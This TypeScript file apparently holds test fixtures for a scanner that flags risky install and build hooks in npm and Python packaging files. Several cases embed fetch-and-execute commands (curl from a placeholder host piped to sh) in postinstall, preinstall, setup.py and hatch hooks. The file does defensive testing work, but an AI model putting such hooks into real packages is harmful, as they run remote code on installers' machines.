import type { Case } from "../test-fixture.ts";

const scripts = (hooks: Record<string, string>): string =>
  `${JSON.stringify({ name: "tool", scripts: hooks }, null, 2)}\n`;

const setupPy = (...body: string[]): string =>
  [
    "from setuptools import setup",
    "from setuptools.command.install import install",
    "",
    ...body,
    "",
    "setup(name='tool', cmdclass={'install': PostInstall})",
    "",
  ].join("\n");

export default [
  {
    name: "a postinstall that runs inline code",
    path: "package.json",
    content: scripts({
      postinstall: "node -e \"require('child_process').exec('curl -s https://x.invalid/p|sh')\"",
    }),
    fire: [{ severity: "critical", line: 4 }],
  },
  {
    name: "a postinstall that runs a bundled script",
    path: "package.json",
    content: scripts({ postinstall: "node scripts/setup.js" }),
    fire: [{ severity: "warn", line: 4 }],
  },
  {
    name: "a preinstall that downloads",
    path: "tools/package.json",
    content: scripts({
      test: "bun test",
      preinstall: "curl -s https://x.invalid/a.sh -o a.sh && bash a.sh",
    }),
    fire: [{ severity: "critical", line: 5 }],
  },
  {
    name: "an install script with sh -c",
    path: "package.json",
    content: scripts({ install: "sh -c 'make all'" }),
    fire: [{ severity: "critical", line: 4 }],
  },
  {
    name: "a package.json that does not parse",
    path: "package.json",
    content: '{ "scripts": { "postinstall": "node x.js" }\n',
    fire: [{ severity: "warn" }],
  },
  {
    name: "a setup.py install command",
    path: "setup.py",
    content: setupPy(
      "class PostInstall(install):",
      "    def run(self):",
      "        install.run(self)",
    ),
    fire: [{ severity: "warn", line: 8 }],
  },
  {
    name: "a setup.py install command that downloads",
    path: "setup.py",
    content: setupPy(
      "import os",
      "class PostInstall(install):",
      "    def run(self):",
      "        os.system('curl -s https://x.invalid/p | sh')",
    ),
    fire: [{ severity: "critical", line: 9 }],
  },
  {
    name: "a hatch custom build hook",
    path: "pyproject.toml",
    content:
      '[project]\nname = "tool"\n\n[tool.hatch.build.hooks.custom]\npath = "hatch_build.py"\n',
    fire: [{ severity: "warn", line: 4 }],
  },
  {
    name: "a hatch hook that runs a download",
    path: "pyproject.toml",
    content:
      '[[tool.hatch.build.hooks.build-scripts.scripts]]\ncommands = ["curl -s https://x.invalid/p | sh"]\n',
    fire: [{ severity: "critical", line: 1 }],
  },
  {
    name: "an in-tree build backend",
    path: "pyproject.toml",
    content:
      '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["_build"]\n',
    fire: [{ severity: "warn", line: 4 }],
  },
  {
    name: "a pyproject.toml that does not parse",
    path: "pyproject.toml",
    content: "[project\nname = tool\n",
    fire: [{ severity: "warn" }],
  },
  {
    name: "husky install",
    path: "package.json",
    content: scripts({ postinstall: "husky install" }),
    silent: "info",
  },
  {
    name: "scripts that do not run on install",
    path: "package.json",
    content: scripts({ test: "bun test", build: "tsc", prepublishOnly: "npm run build" }),
    silent: "none",
  },
  {
    name: "a setup.py without an install command",
    path: "setup.py",
    content: "from setuptools import setup\n\nsetup(name='tool', version='1.0')\n",
    silent: "none",
  },
  {
    name: "a pyproject.toml with a standard backend",
    path: "pyproject.toml",
    content:
      '[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n\n[project]\nname = "tool"\n',
    silent: "none",
  },
  {
    name: "a postinstall named in a Markdown file",
    path: "SKILL.md",
    content: '---\nname: probe\ndescription: probe\n---\nAdd `"postinstall": "node x.js"`.\n',
    silent: "none",
  },
] satisfies Case[];
